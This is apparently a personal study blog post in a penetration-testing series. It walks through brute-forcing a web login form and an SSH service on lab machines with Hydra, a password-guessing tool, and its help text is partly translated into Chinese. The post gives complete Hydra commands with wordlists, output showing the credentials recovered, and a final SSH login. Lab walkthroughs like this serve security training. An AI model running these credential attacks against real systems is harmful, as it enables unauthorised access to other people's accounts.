---
layout: post
title: "Hydra Authentication Cracking"
date: "2022-07-12"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Network Attacks
---

# Hydra Authentication Cracking
inspect the login page.
inspect the source code of the application.

```html
<form method="POST" action="login.php">
    <p>
        <label>Username: </label>
        <input name="usr">
    </p>
    <p>
        <label>Password: </label>
        <input name="pwd">
    </p>
</form>
```

```
└─# hydra   
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

Options:
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -U        service module usage details
  -m OPT    options specific for a module, see -U output for information
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)

Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

Hydra is a tool to guess/crack valid login/password pairs.
Licensed under AGPL v3.0. The newest version is always available at;
https://github.com/vanhauser-thc/thc-hydra
Please don't use in military or secret service organizations, or for illegal
purposes. (This is a wish and non-binding - most such people do not care about
laws and ethics anyway - and tell themselves they are one of the good ones.)

Example:  hydra -l user -P passlist.txt ftp://192.168.0.1

```

`hydra -U http-post-form`

```
└─# hydra -U http-post-form
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-12 08:37:18

Help for module http-post-form:
============================================================================
Module http-post-form requires the page and the parameters for the web form.

By default this module is configured to follow a maximum of 5 redirections in
a row. It always gathers a new cookie from the same URL without variables
The parameters take three ":" separated values, plus optional values.
(Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)

Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
First is the page on the server to GET or POST to (URL).
Second is the POST/GET variables (taken from either the browser, proxy, etc.
 with url-encoded (resp. base64-encoded) usernames and passwords being replaced in the
 "^USER^" (resp. "^USER64^") and "^PASS^" (resp. "^PASS64^") placeholders (FORM PARAMETERS)
Third is the string that it checks for an *invalid* login (by default)
 Invalid condition login check can be preceded by "F=", successful condition
 login check must be preceded by "S=".
 This is where most people get it wrong. You have to check the webapp what a
 failed string looks like and put it in this parameter!
The following parameters are optional:
 (c|C)=/page/uri     to define a different page to gather initial cookies from
 (g|G)=              skip pre-requests - only use this when no pre-cookies are required
 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
                 ^USER[64]^ and ^PASS[64]^ can also be put into these headers!
                 Note: 'h' will add the user-defined header at the end
                 regardless it's already being sent by Hydra or not.
                 'H' will replace the value of that header if it exists, by the
                 one supplied by the user, or add the header at the end
Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
 All colons that are not option separators should be escaped (see the examples above and below).
 You can specify a header without escaping the colons, but that way you will not be able to put colons
 in the header value itself, as they will be interpreted by hydra as option separators.

Examples:
 "/login.php:user=^USER^&pass=^PASS^:incorrect"
 "/login.php:user=^USER64^&pass=^PASS64^&colon=colon\:escape:S=authlog=.*success"
 "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
 "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^:H=User-Agent\: wget"
 "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
```

```
模块 http-post-form 的帮助：
================================================== ===========================
模块 http-post-form 需要 web 表单的页面和参数。

默认情况下，此模块配置为最多连续 5 次重定向。它总是从同一个 URL 收集一个没有变量的新 cookie。
参数采用三个“：”分隔值，加上可选值。 （注意：如果您需要在选项字符串中使用冒号作为值，请使用“\:”对其进行转义，但不要使用“\\”对“\”进行转义。）

语法：<url>:<表单参数>:<条件字符串>[:<可选>[:<可选>]
首先是服务器上要 GET 或 POST 到（URL）的页面。
其次是 POST/GET 变量（取自浏览器、代理等，其中 url 编码（分别为 base64 编码）用户名和密码被替换为“^USER^”（分别为“^USER64^”）和 "^PASS^" (resp. "^PASS64^") 占位符 (FORM PARAMETERS)。第三个是它检查 *invalid* 登录的字符串（默认情况下）。无效条件登录检查可以在 "F= ”，成功条件登录检查必须在“S=”之前。这是大多数人错误的地方。您必须检查webapp的失败字符串是什么样的，并将其放入此参数中！
以下参数是可选的：
 (c|C)=/page/uri 定义一个不同的页面来收集初始 cookie
 (g|G)= 跳过预请求 - 仅在不需要预 cookie 时使用
 (h|H)=My-Hdr\: foo 为每个请求发送一个用户定义的 HTTP 标头 ^USER[64]^ 和 ^PASS[64]^ 也可以放入这些标头中！
                 注意：'h' 将在末尾添加用户定义的标题，无论它是否已经由 Hydra 发送。
                 'H' 将替换该标题的值（如果存在），由用户提供的值，或在末尾添加标题。
请注意，如果您要在标题中添加冒号 (:)，则应使用反斜杠 (\) 转义它们。所有不是选项分隔符的冒号都应该转义（参见上面和下面的示例）。您可以在不转义冒号的情况下指定标题，但这样您将无法将冒号放入标题值本身，因为它们将被 hydra 解释为选项分隔符。

Examples:
 "/login.php:user=^USER^&pass=^PASS^:incorrect"
 "/login.php:user=^USER64^&pass=^PASS64^&colon=colon\:escape:S=authlog=.*success"
 "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
 "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^:H=User-Agent\: wget"
 "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
```

在`/login.php`中，输入无效的用户名和密码。我们被重定向到`/login.php`，并且页面显示`Invalid credentials`。
使用有效的用户名和密码登录，我们被重定向到`/index.php`。我们可以为有效凭证设置`LOGOUT`字符串，该字符串只有在成功登录后才会显示。

`-f`: tell hydra to exit after the first found login. The tool stops when it finds valid credentials. 

`-V`: Verbosity level, display every login attempt the tool perform.

```
hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -f -V

[80][www-form] host: 192.168.3.22 login: admin password: 123abc
```

```
nmap -p22 192.168.102.143

PORT    STATE SERVICE
22/tcp  open  ssh
```

```
hydra -U ssh

Help for module ssh:
============================================================================
The Module ssh does not need or support optional parameters

模块 ssh 的帮助：
==================================================== ===========================
Module ssh 不需要也不支持可选参数
```

`-f`: stop hydra when find working username and passwords. 

`-V`: for the verbosity.

```
hydra 192.168.102.143 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -f -V

[22][ssh] host: 192.168.102.143 login: administrator password: 666666
```

```
ssh administrator@192.168.102.143

administrator@listsnarf-bb-vm:~$ ifconfig
```
